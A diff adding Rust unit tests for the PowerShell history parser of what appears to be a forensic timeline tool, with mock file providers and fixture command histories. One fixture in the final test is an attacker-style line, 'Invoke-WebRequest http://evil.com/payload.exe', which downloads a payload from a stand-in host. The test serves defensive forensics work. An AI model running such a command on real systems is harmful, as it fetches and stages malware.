@@ -395,4 +395,297 @@ mod tests {
         let path = "uploads/auto/Windows.KapeFiles.Targets/Users/hacker/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt";
         assert_eq!(extract_username_from_path(path), "hacker");
     }
+
+    // ─── Pipeline integration and deeper coverage ────────────────────────
+
+    #[test]
+    fn test_parse_powershell_history_pipeline_with_data() {
+        use crate::collection::path::NormalizedPath;
+
+        let mut manifest = ArtifactManifest::default();
+        manifest.powershell_history.push(
+            NormalizedPath::from_image_path(
+                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
+                'C',
+            ),
+        );
+
+        let mut store = TimelineStore::new();
+
+        struct HistoryProvider;
+        impl CollectionProvider for HistoryProvider {
+            fn discover(&self) -> ArtifactManifest {
+                ArtifactManifest::default()
+            }
+            fn open_file(
+                &self,
+                _path: &crate::collection::path::NormalizedPath,
+            ) -> Result<Vec<u8>> {
+                Ok(b"Get-Process\nGet-Service\nwhoami\n".to_vec())
+            }
+            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
+                crate::collection::provider::CollectionMetadata::default()
+            }
+        }
+
+        let result = parse_powershell_history(&HistoryProvider, &manifest, &mut store);
+        assert!(result.is_ok());
+        assert_eq!(store.len(), 3);
+
+        let e0 = store.get(0).unwrap();
+        assert!(e0.path.contains("[PowerShell:History]"));
+        assert!(e0.path.contains("Get-Process"));
+        assert!(e0.path.contains("admin"));
+        assert!(e0.path.contains("line: 1"));
+        assert_eq!(e0.event_type, EventType::Execute);
+        assert!(matches!(&e0.sources[0], ArtifactSource::Registry(s) if s == "PSReadLine"));
+
+        let e2 = store.get(2).unwrap();
+        assert!(e2.path.contains("whoami"));
+        assert!(e2.path.contains("line: 3"));
+    }
+
+    #[test]
+    fn test_parse_powershell_history_pipeline_with_empty_file() {
+        use crate::collection::path::NormalizedPath;
+
+        let mut manifest = ArtifactManifest::default();
+        manifest.powershell_history.push(
+            NormalizedPath::from_image_path(
+                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
+                'C',
+            ),
+        );
+
+        let mut store = TimelineStore::new();
+
+        struct EmptyProvider;
+        impl CollectionProvider for EmptyProvider {
+            fn discover(&self) -> ArtifactManifest {
+                ArtifactManifest::default()
+            }
+            fn open_file(
+                &self,
+                _path: &crate::collection::path::NormalizedPath,
+            ) -> Result<Vec<u8>> {
+                Ok(vec![])
+            }
+            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
+                crate::collection::provider::CollectionMetadata::default()
+            }
+        }
+
+        let result = parse_powershell_history(&EmptyProvider, &manifest, &mut store);
+        assert!(result.is_ok());
+        assert_eq!(store.len(), 0);
+    }
+
+    #[test]
+    fn test_parse_powershell_history_pipeline_with_failing_provider() {
+        use crate::collection::path::NormalizedPath;
+
+        let mut manifest = ArtifactManifest::default();
+        manifest.powershell_history.push(
+            NormalizedPath::from_image_path(
+                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
+                'C',
+            ),
+        );
+
+        let mut store = TimelineStore::new();
+
+        struct FailProvider;
+        impl CollectionProvider for FailProvider {
+            fn discover(&self) -> ArtifactManifest {
+                ArtifactManifest::default()
+            }
+            fn open_file(
+                &self,
+                _path: &crate::collection::path::NormalizedPath,
+            ) -> Result<Vec<u8>> {
+                anyhow::bail!("File not found")
+            }
+            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
+                crate::collection::provider::CollectionMetadata::default()
+            }
+        }
+
+        let result = parse_powershell_history(&FailProvider, &manifest, &mut store);
+        assert!(result.is_ok());
+        assert_eq!(store.len(), 0);
+    }
+
+    #[test]
+    fn test_parse_powershell_history_pipeline_multiple_files() {
+        use crate::collection::path::NormalizedPath;
+
+        let mut manifest = ArtifactManifest::default();
+        manifest.powershell_history.push(
+            NormalizedPath::from_image_path(
+                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
+                'C',
+            ),
+        );
+        manifest.powershell_history.push(
+            NormalizedPath::from_image_path(
+                "/Users/analyst/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
+                'C',
+            ),
+        );
+
+        let mut store = TimelineStore::new();
+
+        struct MultiProvider;
+        impl CollectionProvider for MultiProvider {
+            fn discover(&self) -> ArtifactManifest {
+                ArtifactManifest::default()
+            }
+            fn open_file(
+                &self,
+                path: &crate::collection::path::NormalizedPath,
+            ) -> Result<Vec<u8>> {
+                if path.to_string().contains("admin") {
+                    Ok(b"cmd1\ncmd2\n".to_vec())
+                } else {
+                    Ok(b"cmd3\n".to_vec())
+                }
+            }
+            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
+                crate::collection::provider::CollectionMetadata::default()
+            }
+        }
+
+        let result = parse_powershell_history(&MultiProvider, &manifest, &mut store);
+        assert!(result.is_ok());
+        assert_eq!(store.len(), 3); // 2 from admin + 1 from analyst
+    }
+
+    #[test]
+    fn test_extract_username_from_path_velociraptor_fallback_no_split() {
+        // Path has "users" in lowercase but no path separator after the username
+        // This tests the fallback path (lines 41-46)
+        let path = "C:\\Users\\AdminNoTrailing";
+        let result = extract_username_from_path(path);
+        // The first branch (split by separators) should handle this
+        assert_eq!(result, "AdminNoTrailing");
+    }
+
+    #[test]
+    fn test_extract_username_from_path_embedded_users_string() {
+        // "users" appears in the path but not as a proper path component
+        let path = "D:\\myusers_backup\\file.txt";
+        // The split-based approach won't match since no component is exactly "Users"
+        // The fallback find("users") will match "users" in "myusers_backup"
+        let result = extract_username_from_path(path);
+        // It finds "users" at some position in "myusers_backup", skips 6 chars
+        // and takes until next separator. This is the fallback behavior.
+        assert!(!result.is_empty());
+    }
+
+    #[test]
+    fn test_parse_posh_history_only_newlines() {
+        let content = "\n\n\n\n\n";
+        let entries = parse_posh_history(content, "user");
+        assert!(entries.is_empty());
+    }
+
+    #[test]
+    fn test_parse_posh_history_tabs_only() {
+        let content = "\t\t\t";
+        let entries = parse_posh_history(content, "user");
+        assert!(entries.is_empty());
+    }
+
+    #[test]
+    fn test_parse_posh_history_mixed_whitespace_and_commands() {
+        let content = "\t\n  cmd1  \n\t\n  \n  cmd2\t\n";
+        let entries = parse_posh_history(content, "u");
+        assert_eq!(entries.len(), 2);
+        assert_eq!(entries[0].command, "cmd1");
+        assert_eq!(entries[1].command, "cmd2");
+    }
+
+    #[test]
+    fn test_parse_powershell_history_pipeline_utf8_content() {
+        use crate::collection::path::NormalizedPath;
+
+        let mut manifest = ArtifactManifest::default();
+        manifest.powershell_history.push(
+            NormalizedPath::from_image_path(
+                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
+                'C',
+            ),
+        );
+
+        let mut store = TimelineStore::new();
+
+        struct Utf8Provider;
+        impl CollectionProvider for Utf8Provider {
+            fn discover(&self) -> ArtifactManifest {
+                ArtifactManifest::default()
+            }
+            fn open_file(
+                &self,
+                _path: &crate::collection::path::NormalizedPath,
+            ) -> Result<Vec<u8>> {
+                // UTF-8 BOM + content
+                let mut data = vec![0xEF, 0xBB, 0xBF]; // BOM
+                data.extend_from_slice("Write-Output '\u{00e9}l\u{00e8}ve'\n".as_bytes());
+                Ok(data)
+            }
+            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
+                crate::collection::provider::CollectionMetadata::default()
+            }
+        }
+
+        let result = parse_powershell_history(&Utf8Provider, &manifest, &mut store);
+        assert!(result.is_ok());
+        // BOM line + command line (BOM is part of the first line)
+        assert!(store.len() >= 1);
+    }
+
+    #[test]
+    fn test_parse_powershell_history_pipeline_timeline_entry_fields() {
+        use crate::collection::path::NormalizedPath;
+
+        let mut manifest = ArtifactManifest::default();
+        manifest.powershell_history.push(
+            NormalizedPath::from_image_path(
+                "/Users/hacker/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
+                'C',
+            ),
+        );
+
+        let mut store = TimelineStore::new();
+
+        struct SingleCmdProvider;
+        impl CollectionProvider for SingleCmdProvider {
+            fn discover(&self) -> ArtifactManifest {
+                ArtifactManifest::default()
+            }
+            fn open_file(
+                &self,
+                _path: &crate::collection::path::NormalizedPath,
+            ) -> Result<Vec<u8>> {
+                Ok(b"Invoke-WebRequest http://evil.com/payload.exe\n".to_vec())
+            }
+            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
+                crate::collection::provider::CollectionMetadata::default()
+            }
+        }
+
+        let before = chrono::Utc::now();
+        let result = parse_powershell_history(&SingleCmdProvider, &manifest, &mut store);
+        let after = chrono::Utc::now();
+        assert!(result.is_ok());
+        assert_eq!(store.len(), 1);
+
+        let te = store.get(0).unwrap();
+        assert!(te.path.contains("Invoke-WebRequest"));
+        assert!(te.path.contains("hacker"));
+        assert_eq!(te.event_type, EventType::Execute);
+        // Timestamp should be around now
+        assert!(te.primary_timestamp >= before);
+        assert!(te.primary_timestamp <= after);
+    }
 }
